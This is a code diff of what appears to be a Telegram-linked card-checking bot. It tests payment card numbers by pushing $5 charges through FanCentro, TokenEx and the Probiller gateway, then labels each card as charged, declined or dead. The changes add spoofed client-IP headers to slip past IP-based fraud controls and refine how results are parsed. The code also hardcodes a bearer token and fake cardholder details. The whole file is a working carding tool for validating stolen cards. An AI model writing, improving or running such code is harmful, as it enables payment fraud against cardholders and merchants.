@@ -34,6 +34,7 @@ STRIPE_KEYS = {}
 pending_files = {}
 hit_counter = 0
 HIT_CHAT_ID = -1002429830194
+MY_IP = "41.235.10.195"
 
 # ==================== FanCentro Data ====================
 FAN_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3ODgxNTU5MDYsInBvcnRhbCI6ImZoIiwibmljayI6Imdvb2dsZTE3ODc5NzI0ODMiLCJ1X2lkIjoxNTExNDgxMTF9.RYi_7Jrt66zWWFozEgmg7q7FeD2LzXs1Z01bJLZwqH8"
@@ -120,30 +121,43 @@ async def get_bin_info(bin_number):
 # ==================== FanCentro Functions ====================
 def fan_refresh_token():
     global FAN_TOKEN
-    h = {'authorization': f'Bearer {FAN_TOKEN}', 'content-type': 'application/json', 'cookie': FAN_COOKIE, 'origin': 'https://fancentro.com', 'referer': 'https://fancentro.com/', 'user-agent': 'Mozilla/5.0'}
+    h = {
+        'authorization': f'Bearer {FAN_TOKEN}',
+        'content-type': 'application/json',
+        'cookie': FAN_COOKIE,
+        'origin': 'https://fancentro.com',
+        'referer': 'https://fancentro.com/',
+        'user-agent': 'Mozilla/5.0',
+        'X-Forwarded-For': MY_IP,
+        'X-Real-IP': MY_IP,
+        'CF-Connecting-IP': MY_IP,
+        'True-Client-IP': MY_IP,
+    }
     p = {"withCredentials": True, "isRefreshToken": True}
     try:
         r = requests.post("https://fancentro.com/api/v1/api/refreshToken", json=p, headers=h, timeout=30)
         if r.status_code == 200:
             data = r.json()
-            for key in ['token', 'jwt', 'access_token', 'refreshToken', 'accessToken']:
-                if key in data and data[key]:
-                    FAN_TOKEN = data[key]
-                    return True
-            auth = r.headers.get('authorization', '')
-            if auth:
-                FAN_TOKEN = auth.replace('Bearer ', '')
-                return True
-            match = re.search(r'eyJ[A-Za-z0-9\-\._]{50,}', r.text)
-            if match:
-                FAN_TOKEN = match.group(0)
+            if 'token' in data and data['token']:
+                FAN_TOKEN = data['token']
                 return True
     except:
         pass
     return False
 
 def fan_headers():
-    return {'authorization': f'Bearer {FAN_TOKEN}', 'content-type': 'application/json', 'cookie': FAN_COOKIE, 'origin': 'https://fancentro.com', 'referer': 'https://fancentro.com/chat', 'user-agent': 'Mozilla/5.0'}
+    return {
+        'authorization': f'Bearer {FAN_TOKEN}',
+        'content-type': 'application/json',
+        'cookie': FAN_COOKIE,
+        'origin': 'https://fancentro.com',
+        'referer': 'https://fancentro.com/chat',
+        'user-agent': 'Mozilla/5.0',
+        'X-Forwarded-For': MY_IP,
+        'X-Real-IP': MY_IP,
+        'CF-Connecting-IP': MY_IP,
+        'True-Client-IP': MY_IP,
+    }
 
 def fan_init():
     p = {"creditAmount":500,"displayAmount":"5","displayAmountFormatted":"5,00 $","priceAmountUsd":5,"taxDisclaimer":"","billingDisclaimer":"One time charge of 5,00 $. Will not rebill.","amount":5,"taxAmount":0,"totalAmount":5,"taxDisplayType":1,"taxApplicationId":"","taxRate":0,"taxName":"","productSku":FAN_SKU,"freeCreditsAmount":0,"freeCreditsPercent":0,"currency":"USD","currencySymbol":"$","creditAmountTotal":500,"paymentType":"cc","paymentMethod":"cc","displayName":"CREDIT CARD","type":"credit","baseAmount":5,"freeCreditAmount":0,"price":"5"}
@@ -159,8 +173,6 @@ def fan_init():
     if not mgpg:
         return f"NO_MGPG: {json.dumps(data)[:300]}"
     vurl = data.get('validationUrl', '')
-    if not vurl:
-        vurl = mgpg.get('validationUrl', '')
     pr = mgpg.get('nextAction', {}).get('extensions', {}).get('proxySettings', {}).get('settings', {})
     return {
         'sid': mgpg.get('sessionId'),
@@ -174,32 +186,52 @@ def fan_init():
 
 def fan_tokenize(s, card, cvv):
     p = {"TokenExID":s['tid'],"Origin":"https://fancentro.com","AuthenticationKey":s['akey'],"Timestamp":s['ts'],"Data":card,"CvvValue":cvv,"TokenScheme":"PCI","CvvOnly":"False","PCI":"True","ReturnHash":None,"use3DS":"False","EnforceLuhnCompliance":"true","CustomDataLuhnCheck":True}
-    h = {'content-type':'application/json','origin':'https://htp.tokenex.com','referer':'https://htp.tokenex.com/iframe/v3','user-agent':'Mozilla/5.0'}
+    h = {
+        'content-type':'application/json',
+        'origin':'https://htp.tokenex.com',
+        'referer':'https://htp.tokenex.com/iframe/v3',
+        'user-agent':'Mozilla/5.0',
+        'X-Forwarded-For': MY_IP,
+        'X-Real-IP': MY_IP,
+    }
     r = requests.post("https://htp.tokenex.com/iframe/v3", json=p, headers=h, timeout=30)
     if r.status_code != 200:
         return None
     return r.json().get('token', '')
 
 def fan_pay(s, token, cvv, em, ey):
-    h = {'Content-Type':'application/json','x-auth-token':s['jwt'],'x-session-id':s['sid'],'x-correlation-id':s['cid'],'Origin':'https://fancentro.com','Referer':'https://fancentro.com/','User-Agent':'Mozilla/5.0'}
+    h = {
+        'Content-Type':'application/json',
+        'x-auth-token':s['jwt'],
+        'x-session-id':s['sid'],
+        'x-correlation-id':s['cid'],
+        'Origin':'https://fancentro.com',
+        'Referer':'https://fancentro.com/',
+        'User-Agent':'Mozilla/5.0',
+        'X-Forwarded-For': MY_IP,
+        'X-Real-IP': MY_IP,
+    }
     p = {"sessionId":s['sid'],"correlationId":s['cid'],"payment":{"paymentInformation":{"cardInformation":{"ccNumber":token,"cvv":cvv,"cardExpirationMonth":em,"cardExpirationYear":ey,"cardHolderInfo":{"firstName":"wafa","lastName":"bro","email":"Iadiitiomjs@gmail.com","countryCode":"US","zipCode":"10001"}}},"validationUrl":s['vurl']}}
     return requests.post("https://mgpg2.probiller.com/api/process", json=p, headers=h, timeout=30)
 
 def fan_check_card(card, cvv, em, ey):
     fan_refresh_token()
-    time.sleep(2)  # ← ضيف السطر ده
+    time.sleep(2)
     
     s = fan_init()
     if isinstance(s, str):
         return f"ERROR: {s}"
     if not s:
         return "ERROR: Init failed"
+    
     t = fan_tokenize(s, card, cvv)
     if not t:
         return "ERROR: TokenEx failed"
+    
     r = fan_pay(s, t, cvv, em, ey)
     if r.status_code != 200:
-        return f"ERROR {r.status_code}: {r.text[:100]}"
+        return f"ERROR {r.status_code}: {r.text[:200]}"
+    
     d = r.json()
     charges = d.get('invoice', {}).get('charges', [])
     if charges:
@@ -207,18 +239,40 @@ def fan_check_card(card, cvv, em, ey):
         status = c.get('status', '')
         reason = c.get('reason', '')
         error_msg = c.get('errorClassification', {}).get('groupMessage', '')
+        
         if status == 'approved':
             return "CHARGE 5$"
         elif 'INSUFFICIENT' in reason.upper() or 'FUNDS' in reason.upper() or 'INSUFFICIENT' in error_msg.upper():
             return "INSUFFICIENT_FUNDS"
         elif status == 'decline':
-            return f"DECLINED - {reason}"
+            if reason:
+                return f"DECLINED - {reason}"
+            elif error_msg:
+                return f"DECLINED - {error_msg}"
+            else:
+                return "DECLINED - Declined"
         elif status == 'aborted':
-            return f"DEAD - {reason}"
+            if reason:
+                return f"DEAD - {reason}"
+            elif error_msg:
+                return f"DEAD - {error_msg}"
+            else:
+                return "DEAD - Data Validation Error"
         else:
-            return f"{status} - {reason}"
-    return d.get('nextAction', {}).get('reason', 'Unknown')
+            if reason:
+                return f"{status.upper()} - {reason}"
+            elif error_msg:
+                return f"{status.upper()} - {error_msg}"
+            else:
+                return f"{status.upper()}"
     
+    next_action = d.get('nextAction', {})
+    reason = next_action.get('reason', '')
+    if reason:
+        return reason
+    
+    return "UNKNOWN ERROR"
+
 def fan_parse_line(line):
     line = line.strip()
     parts = None
